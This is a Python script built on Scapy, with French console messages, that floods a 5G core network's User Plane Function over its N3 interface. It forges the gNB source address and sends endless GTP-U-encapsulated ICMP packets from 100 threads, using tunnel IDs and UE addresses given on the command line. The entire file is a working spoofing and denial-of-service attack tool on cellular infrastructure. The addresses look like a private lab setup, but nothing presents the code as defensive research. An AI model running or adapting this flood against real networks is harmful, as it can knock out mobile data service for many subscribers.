import threading
import signal
import sys
import logging
import itertools
from scapy.all import send, conf
from scapy.contrib.gtp import GTP_U_Header, GTPPDUSessionContainer
from scapy.layers.inet import IP, UDP, ICMP

UPF2_N3_IP  = "10.10.3.2"
GNB_IP      = "10.10.3.231"
NUM_THREADS = 100

if len(sys.argv) < 2:
    print("Usage: python3 gtp-flood-upf2.py <teid:ue_ip> ...")
    sys.exit(1)

TEID_UE_MAP = {}
for arg in sys.argv[1:]:
    teid_str, ue_ip = arg.split(":")
    TEID_UE_MAP[int(teid_str, 16)] = ue_ip

conf.iface = "n3"

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(threadName)s] %(message)s')
logger = logging.getLogger(__name__)

def make_gtp_pkt(teid, ue_ip):
    return (
        IP(src=GNB_IP, dst=UPF2_N3_IP) /
        UDP(sport=2152, dport=2152) /
        GTP_U_Header(teid=teid, gtp_type=0xff, E=1) /
        GTPPDUSessionContainer(type=1, QFI=1) /
        IP(src=ue_ip, dst="8.8.8.8") /
        ICMP()
    )

class FloodThread(threading.Thread):
    def __init__(self, tid):
        super().__init__(name=f"GTP-Flood-{tid}")
        self.tid     = tid
        self.running = True
        self.cycle   = itertools.cycle(list(TEID_UE_MAP.items()))

    def run(self):
        while self.running:
            try:
                teid, ue_ip = next(self.cycle)
                send(make_gtp_pkt(teid, ue_ip), verbose=0, iface="n3")
            except Exception as e:
                logger.error(f"Erreur : {e}")

    def stop(self):
        self.running = False

threads = []

def shutdown(sig, frame):
    print("\n[!] Arret...")
    for t in threads:
        t.stop()
    for t in threads:
        t.join()
    sys.exit(0)

signal.signal(signal.SIGINT,  shutdown)
signal.signal(signal.SIGTERM, shutdown)

print(f"""
╔══════════════════════════════════════════════╗
║  GTP-U 5G Flood (PDU Session) — UPF2      ║
╠══════════════════════════════════════════════╣
║  gNB usurpe : {GNB_IP}           ║
║  UPF2 n3    : {UPF2_N3_IP}               ║
║  Threads    : {NUM_THREADS}                            ║
╚══════════════════════════════════════════════╝
""")
input("Appuie sur Entree pour lancer...\n")

for i in range(NUM_THREADS):
    t = FloodThread(i)
    t.daemon = True
    t.start()
    threads.append(t)

print(f"[+] {NUM_THREADS} threads lances. Ctrl+C pour stopper.")
for t in threads:
    t.join()
